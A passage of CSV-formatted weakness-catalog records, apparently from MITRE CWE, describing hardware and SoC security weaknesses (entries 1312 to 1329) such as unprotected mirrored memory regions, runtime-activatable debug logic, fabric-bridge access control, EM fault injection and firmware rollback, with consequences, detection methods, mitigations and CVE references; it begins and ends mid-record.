Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:The translation must map signals in such a way that untrusted agents cannot map to trusted agents or vice-versa.::PHASE:Implementation:DESCRIPTION:Ensure that the translation maps signals in such a way that untrusted agents cannot map to trusted agents or vice-versa.::\",\"\",,,\"\",::1::180::233::,\"\",\n1312,\"Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\",Base,Draft,\"The firewall in an on-chip fabric protects the main addressed region, but it does not protect any mirrored memory or memory-mapped-IO (MMIO) regions.\",\"Few fabrics mirror memory and address ranges, where mirrored regions contain copies of the original data. This redundancy is used to achieve fault tolerance. Whatever protections the fabric firewall implements for the original region should also apply to the mirrored regions. If not, an attacker could bypass existing read/write protections by reading from/writing to the mirrored regions to leak or corrupt the original data.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:1251:VIEW ID:1194::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Manual Dynamic Analysis:DESCRIPTION:Using an external debugger, send write transactions to mirrored regions to test if original, write-protected regions are modified. Similarly, send read transactions to mirrored regions to test if the original, read-protected signals can be read.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:The fabric firewall should apply the same protections as the original region to the mirrored regions.::PHASE:Implementation:DESCRIPTION:The fabric firewall should apply the same protections as the original region to the mirrored regions.::\",\"\",,,\"\",::456::679::,\"\",\n1313,\"Hardware Allows Activation of Test or Debug Logic at Runtime\",Base,Draft,\"During runtime, the hardware allows for test or debug logic (feature) to be activated, which allows for changing the state of the hardware. This feature can alter the intended behavior of the system and allow for alteration and leakage of sensitive data by an adversary.\",\"An adversary can take advantage of test or debug logic that is made accessible through the hardware during normal operation to modify the intended behavior of the system. For example, an accessible Test/debug mode may allow read/write access to any system data. Using error injection (a common test/debug feature) during a transmit/receive operation on a bus, data may be modified to produce an unintended message. Similarly, confidentiality could be compromised by such features allowing access to secrets.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues could be introduced during hardware architecture and design and identified later during Testing or System Configuration phases.::PHASE:Implementation:NOTE:Such issues could be introduced during implementation and identified later during Testing or System Configuration phases.::PHASE:Integration:NOTE:Such issues could be introduced during integration and identified later during Testing or System configuration phases.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Instability:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):IMPACT:DoS: Resource Consumption (Other):IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Alter Execution Logic:IMPACT:Quality Degradation:IMPACT:Unexpected State:IMPACT:Reduce Performance:IMPACT:Reduce Reliability::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Insert restrictions on when the hardware's test or debug features can be activated. For example, during normal operating modes, the hardware's privileged modes that allow access to such features cannot be activated. Configuring the hardware to only enter a test or debug mode within a window of opportunity such as during boot or configuration stage. The result is disablement of such test/debug features and associated modes during normal runtime operations.::PHASE:Implementation:DESCRIPTION:Insert restrictions on when the hardware's test or debug features can be activated. For example, during normal operating modes, the hardware's privileged modes that allow access to such features cannot be activated. Configuring the hardware to only enter a test or debug mode within a window of opportunity such as during boot or configuration stage. The result is disablement of such test/debug features and associated modes during normal runtime operations.::PHASE:Integration:DESCRIPTION:Insert restrictions on when the hardware's test or debug features can be activated. For example, during normal operating modes, the hardware's privileged modes that allow access to such features cannot be activated. Configuring the hardware to only enter a test or debug mode within a window of opportunity such as during boot or configuration stage. The result is disablement of such test/debug features and associated modes during normal runtime operations.::\",\"::REFERENCE:CVE-2021-33150:DESCRIPTION:Hardware processor allows activation of test or debug logic at runtime.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-33150::REFERENCE:CVE-2021-0146:DESCRIPTION:Processor allows the activation of test or debug logic at runtime, allowing escalation of privileges:LINK:https://www.cve.org/CVERecord?id=CVE-2021-0146::\",,,\"\",::121::,\"\",\n1314,\"Missing Write Protection for Parametric Data Values\",Base,Draft,\"The device does not write-protect the parametric data values for sensors that scale the sensor value, allowing untrusted software to manipulate the apparent result and potentially damage hardware or cause operational failure.\",\"Various sensors are used by hardware to detect any devices operating outside of the design limits. The threshold limit values are set by hardware fuses or trusted software such as the BIOS. These limits may be related to thermal, power, voltage, current, and frequency. Hardware mechanisms may be used to protect against alteration of the threshold limit values by untrusted software. The limit values are generally programmed in standard units for the type of value being read. However, the hardware-sensor blocks may report the settings in different units depending upon sensor design and operation. The raw sensor output value is converted to the desired units using a scale conversion based on the parametric data programmed into the sensor. The final converted value is then compared with the previously programmed limits. While the limit values are usually protected, the sensor parametric data values may not be. By changing the parametric data, safe operational limits may be bypassed.\",::NATURE:ChildOf:CWE ID:862:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:1299:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Sensor Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:The lack of a requirement to protect parametric values may contribute to this weakness.::PHASE:Implementation:NOTE:The lack of parametric value protection may be a cause of this weakness.::\",\"\",,\"::SCOPE:Availability:IMPACT:Quality Degradation:IMPACT:DoS: Resource Consumption (Other):LIKELIHOOD:High:NOTE:Sensor value manipulation, particularly thermal or power, may allow physical damage to occur or disabling of the device by a false fault shutdown causing a Denial-Of-Service.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Access controls for sensor blocks should ensure that only trusted software is allowed to change threshold limits and sensor parametric data.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2017-8252:DESCRIPTION:Kernel can inject faults in computations during the execution of TrustZone leading to information disclosure in Snapdragon Auto, Snapdragon Compute, Snapdragon Connectivity, Snapdragon Consumer Electronics Connectivity, Snapdragon Consumer IOT, Snapdragon Industrial IOT, Snapdragon IoT, Snapdragon Mobile, Snapdragon Voice and Music, Snapdragon Wearables, Snapdragon Wired Infrastructure and Networking.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-8252::\",,,\"\",::1::,\"\",\n1315,\"Improper Setting of Bus Controlling Capability in Fabric End-point\",Base,Incomplete,\"The bus controller enables bits in the fabric end-point to allow responder devices to control transactions on the fabric.\",\"To support reusability, certain fabric interfaces and end points provide a configurable register bit that allows IP blocks connected to the controller to access other peripherals connected to the fabric. This allows the end point to be used with devices that function as a controller or responder. If this bit is set by default in hardware, or if firmware incorrectly sets it later, a device intended to be a responder on a fabric is now capable of controlling transactions to other devices and might compromise system security.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::PHASE:System Configuration::\",\"\",,\"::SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:For responder devices, the register bit in the fabric end-point that enables the bus controlling capability must be set to 0 by default. This bit should not be set during secure-boot flows. Also, writes to this register must be access-protected to prevent malicious modifications to obtain bus-controlling capability.::PHASE:Implementation:DESCRIPTION:For responder devices, the register bit in the fabric end-point that enables the bus controlling capability must be set to 0 by default. This bit should not be set during secure-boot flows. Also, writes to this register must be access-protected to prevent malicious modifications to obtain bus-controlling capability.::PHASE:System Configuration:DESCRIPTION:For responder devices, the register bit in the fabric end-point that enables the bus controlling capability must be set to 0 by default. This bit should not be set during secure-boot flows. Also, writes to this register must be access-protected to prevent malicious modifications to obtain bus-controlling capability.::\",\"\",,,\"\",::1::180::,\"\",\n1316,\"Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\",Base,Draft,\"The address map of the on-chip fabric has protected and unprotected regions overlapping, allowing an attacker to bypass access control to the overlapping portion of the protected region.\",\"Various ranges can be defined in the system-address map, either in the memory or in Memory-Mapped-IO (MMIO) space. These ranges are usually defined using special range registers that contain information, such as base address and size. Address decoding is the process of determining for which range the incoming transaction is destined. To ensure isolation, ranges containing secret data are access-control protected. Occasionally, these ranges could overlap. The overlap could either be intentional (e.g. due to a limited number of range registers or limited choice in choosing size of the range) or unintentional (e.g. introduced by errors). Some hardware designs allow dynamic remapping of address ranges assigned to peripheral MMIO ranges. In such designs, intentional address overlaps can be created through misconfiguration by malicious software. When protected and unprotected ranges overlap, an attacker could send a transaction and potentially compromise the protections in place, violating the principle of least privilege.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Bus/Interface Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:SCOPE:Authorization:IMPACT:Bypass Protection Mechanism:IMPACT:Read Memory:IMPACT:Modify Memory:LIKELIHOOD:Medium::\",\"::METHOD:Automated Dynamic Analysis:DESCRIPTION:Review address map in specification to see if there are any overlapping ranges.:EFFECTIVENESS:High::METHOD:Manual Static Analysis:DESCRIPTION:Negative testing of access control on overlapped ranges.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:When architecting the address map of the chip, ensure that protected and unprotected ranges are isolated and do not overlap. When designing, ensure that ranges hardcoded in Register-Transfer Level (RTL) do not overlap.::PHASE:Implementation:DESCRIPTION:Ranges configured by firmware should not overlap. If overlaps are mandatory because of constraints such as a limited number of registers, then ensure that no assets are present in the overlapped portion.::PHASE:Testing:DESCRIPTION:Validate mitigation actions with robust testing.::\",\"::REFERENCE:CVE-2009-4419:DESCRIPTION:Attacker can modify MCHBAR register to overlap with an attacker-controlled region, which modification prevents the SENTER instruction from properly applying VT-d protection while a Measured Launch Environment is being launched.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4419::\",,,\"\",::456::679::,\"::TYPE:Maintenance:NOTE:As of CWE 4.6, CWE-1260 and CWE-1316 are siblings under view 1000, but CWE-1260 might be a parent of CWE-1316. More analysis is warranted.::\",\n1317,\"Improper Access Control in Fabric Bridge\",Base,Draft,\"The product uses a fabric bridge for transactions between two Intellectual Property (IP) blocks, but the bridge does not properly perform the expected privilege, identity, or other access control checks between those IP blocks.\",\"In hardware designs, different IP blocks are connected through interconnect-bus fabrics (e.g. AHB and OCP). Within a System on Chip (SoC), the IP block subsystems could be using different bus protocols. In such a case, the IP blocks are then linked to the central bus (and to other IP blocks) through a fabric bridge. Bridges are used as bus-interconnect-routing modules that link different protocols or separate, different segments of the overall SoC interconnect. For overall system security, it is important that the access-control privileges associated with any fabric transaction are consistently maintained and applied, even when they are routed or translated by a fabric bridge. A bridge that is connected to a fabric without security features forwards transactions to the slave without checking the privilege level of the master and results in a weakness in SoC access-control security. The same weakness occurs if a bridge does not check the hardware identity of the transaction received from the slave interface of the bridge.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Bypass Protection Mechanism:IMPACT:Read Memory:IMPACT:Modify Memory:LIKELIHOOD:Medium::\",\"::METHOD:Simulation / Emulation:DESCRIPTION:RTL simulation to ensure that bridge-access controls are implemented properly.:EFFECTIVENESS:High::METHOD:Formal Verification:DESCRIPTION:Formal verification of bridge RTL to ensure that access control cannot be bypassed.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Ensure that the design includes provisions for access-control checks in the bridge for both upstream and downstream transactions.::PHASE:Implementation:DESCRIPTION:Implement access-control checks in the bridge for both upstream and downstream transactions.::\",\"::REFERENCE:CVE-2019-6260:DESCRIPTION:Baseboard Management Controller (BMC) device implements Advanced High-performance Bus (AHB) bridges that do not require authentication for arbitrary read and write access to the BMC's physical address space from the host, and possibly the network [REF-1138].:LINK:https://www.cve.org/CVERecord?id=CVE-2019-6260::\",,,\"\",::122::,\"\",\n1318,\"Missing Support for Security Features in On-chip Fabrics or Buses\",Base,Incomplete,\"On-chip fabrics or buses either do not support or are not configured to support privilege separation or other security features, such as access control.\",\"Certain on-chip fabrics and buses, especially simple and low-power buses, do not support security features. Apart from data transfer and addressing ports, some fabrics and buses do not have any interfaces to transfer privilege, immutable identity, or any other security attribute coming from the bus master. Similarly, they do not have dedicated signals to transport security-sensitive data from slave to master, such as completions for certain types of transactions. Few other on-chip fabrics and buses support security features and define specific interfaces/signals for transporting security attributes from master to slave or vice-versa. However, including these signals is not mandatory and could be left unconfigured when generating the register-transfer-level (RTL) description for the fabric. Such fabrics or buses should not be used to transport any security attribute coming from the bus master. In general, peripherals with security assets should not be connected to such buses before the transaction from the bus master reaches the bus, unless some form of access control is performed at a fabric bridge or another intermediate module.\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Read Memory:IMPACT:Modify Memory:LIKELIHOOD:Medium::\",\"::METHOD:Architecture or Design Review:DESCRIPTION:Review the fabric specification and ensure that it contains signals to transfer security-sensitive signals.:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:Lack of security features can also be confirmed through manual RTL review of the fabric RTL.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:If fabric does not support security features, implement security checks in a bridge or any component that is between the master and the fabric. Alternatively, connect all fabric slaves that do not have any security assets under one such fabric and connect peripherals with security assets to a different fabric that supports security features.::\",\"\",,,\"\",::1::180::,\"\",\n1319,\"Improper Protection against Electromagnetic Fault Injection (EM-FI)\",Base,Incomplete,\"The device is susceptible to electromagnetic fault injection attacks, causing device internal information to be compromised or security mechanisms to be bypassed.\",\"Electromagnetic fault injection may allow an attacker to locally and dynamically modify the signals (both internal and external) of an integrated circuit. EM-FI attacks consist of producing a local, transient magnetic field near the device, inducing current in the device wires. A typical EMFI setup is made up of a pulse injection circuit that generates a high current transient in an EMI coil, producing an abrupt magnetic pulse which couples to the target producing faults in the device, which can lead to: Bypassing security mechanisms such as secure JTAG or Secure Boot Leaking device information Modifying program flow Perturbing secure hardware modules (e.g. random number generators)\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Microcontroller Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Memory Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Power Management Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Test/Debug Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Sensor Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:SCOPE:Availability:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Execute Unauthorized Code or Commands::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:1. Redundancy - By replicating critical operations and comparing the two outputs can help indicate whether a fault has been injected. 2. Error detection and correction codes - Gay, Mael, et al. proposed a new scheme that not only detects faults injected by a malicious adversary but also automatically corrects single nibble/byte errors introduced by low-multiplicity faults. 3. Fail by default coding - When checking conditions (switch or if) check all possible cases and fail by default because the default case in a switch (or the else part of a cascaded if-else-if construct) is used for dealing with the last possible (and valid) value without checking. This is prone to fault injection because this alternative is easily selected as a result of potential data manipulation [REF-1141]. 4. Random Behavior - adding random delays before critical operations, so that timing is not predictable. 5. Program Flow Integrity Protection - The program flow can be secured by integrating run-time checking aiming at detecting control flow inconsistencies. One such example is tagging the source code to indicate the points not to be bypassed [REF-1147]. 6. Sensors - Usage of sensors can detect variations in voltage and current. 7. Shields - physical barriers to protect the chips from malicious manipulation.::\",\"::REFERENCE:CVE-2020-27211:DESCRIPTION:Chain: microcontroller system-on-chip uses a register value stored in flash to set product protection state on the memory bus and does not contain protection against fault injection (CWE-1319) which leads to an incorrect initialization of the memory bus (CWE-1419) causing the product to be in an unprotected state.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-27211::\",,,\"\",::624::625::,\"::TYPE:Maintenance:NOTE:This entry is attack-oriented and may require significant modification in future versions, or even deprecation. It is not clear whether there is really a design mistake that enables such attacks, so this is not necessarily a weakness and may be more appropriate for CAPEC.::\",\n1320,\"Improper Protection for Outbound Error Messages and Alert Signals\",Base,Draft,\"Untrusted agents can disable alerts about signal conditions exceeding limits or the response mechanism that handles such alerts.\",\"Hardware sensors are used to detect whether a device is operating within design limits. The threshold values for these limits are set by hardware fuses or trusted software such as a BIOS. Modification of these limits may be protected by hardware mechanisms. When device sensors detect out of bound conditions, alert signals may be generated for remedial action, which may take the form of device shutdown or throttling. Warning signals that are not properly secured may be disabled or used to generate spurious alerts, causing degraded performance or denial-of-service (DoS). These alerts may be masked by untrusted software. Examples of these alerts involve thermal and power sensor alerts.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Microcontroller Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Memory Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Power Management Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Test/Debug Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Sensor Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Instability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Reduce Reliability:IMPACT:Unexpected State:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Alert signals generated by critical events should be protected from access by untrusted agents. Only hardware or trusted firmware modules should be able to alter the alert configuration.::\",\"\",,,\"\",::1::180::,\"\",\n1323,\"Improper Management of Sensitive Trace Data\",Base,Draft,\"Trace data collected from several sources on the System-on-Chip (SoC) is stored in unprotected locations or transported to untrusted agents.\",\"To facilitate verification of complex System-on-Chip (SoC) designs, SoC integrators add specific IP blocks that trace the SoC's internal signals in real-time. This infrastructure enables observability of the SoC's internal behavior, validation of its functional design, and detection of hardware and software bugs. Such tracing IP blocks collect traces from several sources on the SoC including the CPU, crypto coprocessors, and on-chip fabrics. Traces collected from these sources are then aggregated inside trace IP block and forwarded to trace sinks, such as debug-trace ports that facilitate debugging by external hardware and software debuggers. Since these traces are collected from several security-sensitive sources, they must be protected against untrusted debuggers. If they are stored in unprotected memory, an untrusted software debugger can access these traces and extract secret information. Additionally, if security-sensitive traces are not tagged as secure, an untrusted hardware debugger might access them to extract confidential information.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:NOTE:An adversary can read secret values if they are captured in debug traces and stored unsafely.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Tag traces to indicate owner and debugging privilege level (designer, OEM, or end user) needed to access that trace.::\",\"\",,,\"\",::150::167::545::,\"\",\n1326,\"Missing Immutable Root of Trust in Hardware\",Base,Draft,\"A missing immutable root of trust in the hardware results in the ability to bypass secure boot or execute untrusted or adversarial boot code.\",\"A System-on-Chip (SoC) implements secure boot by verifying or authenticating signed boot code. The signing of the code is achieved by an entity that the SoC trusts. Before executing the boot code, the SoC verifies that the code or the public key with which the code has been signed has not been tampered with. The other data upon which the SoC depends are system-hardware settings in fuses such as whether Secure Boot is enabled. These data play a crucial role in establishing a Root of Trust (RoT) to execute secure-boot flows. One of the many ways RoT is achieved is by storing the code and data in memory or fuses. This memory should be immutable, i.e., once the RoT is programmed/provisioned in memory, that memory should be locked and prevented from further programming or writes. If the memory contents (i.e., RoT) are mutable, then an adversary can modify the RoT to execute their choice of code, resulting in a compromised secure boot. Note that, for components like ROM, secure patching/update features should be supported to allow authenticated and authorized updates in the field.\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Security Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:Such issues could be introduced during policy definition, hardware architecture, design, manufacturing, and/or provisioning. They can be identified later during testing or system configuration phases.::\",\"\",,\"::SCOPE:Authentication:SCOPE:Authorization:IMPACT:Gain Privileges or Assume Identity:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Modify Memory:LIKELIHOOD:High::\",\"::METHOD:Automated Dynamic Analysis:DESCRIPTION:Automated testing can verify that RoT components are immutable.:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:Root of trust elements and memory should be part of architecture and design reviews.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:When architecting the system, the RoT should be designated for storage in a memory that does not allow further programming/writes.::PHASE:Implementation:DESCRIPTION:During implementation and test, the RoT memory location should be demonstrated to not allow further programming/writes.::\",\"\",,,\"\",::679::68::,\"\",\n1328,\"Security Version Number Mutable to Older Versions\",Base,Draft,\"Security-version number in hardware is mutable, resulting in the ability to downgrade (roll-back) the boot firmware to vulnerable code versions.\",\"A System-on-Chip (SoC) implements secure boot or verified boot. It might support a security version number, which prevents downgrading the current firmware to a vulnerable version. Once downgraded to a previous version, an adversary can launch exploits on the SoC and thus compromise the security of the SoC. These downgrade attacks are also referred to as roll-back attacks. The security version number must be stored securely and persistently across power-on resets. A common weakness is that the security version number is modifiable by an adversary, allowing roll-back or downgrade attacks or, under certain circumstances, preventing upgrades (i.e. Denial-of-Service on upgrades). In both cases, the SoC is in a vulnerable state.\",::NATURE:ChildOf:CWE ID:285:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:757:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Security Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:Such issues could be introduced during hardware architecture and design, and can be identified later during testing or system configuration phases.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Authentication:SCOPE:Authorization:IMPACT:Other:LIKELIHOOD:High:NOTE:Impact includes roll-back or downgrade to a vulnerable version of the firmware or DoS (prevent upgrades).::\",\"::METHOD:Automated Dynamic Analysis:DESCRIPTION:Mutability of stored security version numbers and programming with older firmware images should be part of automated testing.:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:Anti-roll-back features should be reviewed as part of Architecture or Design review.:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:When architecting the system, security version data should be designated for storage in registers that are either read-only or have access controls that prevent modification by an untrusted agent.::PHASE:Implementation:DESCRIPTION:During implementation and test, security version data should be demonstrated to be read-only and access controls should be validated.::\",\"\",,,\"\",::176::,\"\",\n1329,\"Reliance on Component That is Not Updateable\",Base,Incomplete,\"The product contains a component that cannot be updated or patched in order to remove vulnerabilities or significant bugs.\",\"If the component is discovered to contain a vulnerability or critical bug, but the issue cannot be fixed using an update or patch, then the product's owner will not be able to protect against the issue. The only option might be replacement of the product, which could be too financially or operationally expensive for the product owner. As a result, the inability to patch or update can leave the product open to attacker exploitation or critical operation failures. This weakness can be especially difficult to manage when using ROM, firmware, or similar components that traditionally have had limited or no update capabilities. In industries such as healthcare, legacy devices can be operated for decades. As a US task force report [REF-1197] notes, the inability to update or replace equipment has both large and small health care delivery organizations struggle with numerous unsupported legacy systems that cannot easily be replaced (hardware, software, and operating systems) with large numbers of vulnerabilities and few modern countermeasures. While hardware can be prone to this weakness, software systems can also be affected, such as when a third-party driver or library is no longer actively maintained or supported but is still critical for the required functionality.\",::NATURE:ChildOf:CWE ID:1357:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:664:VIEW 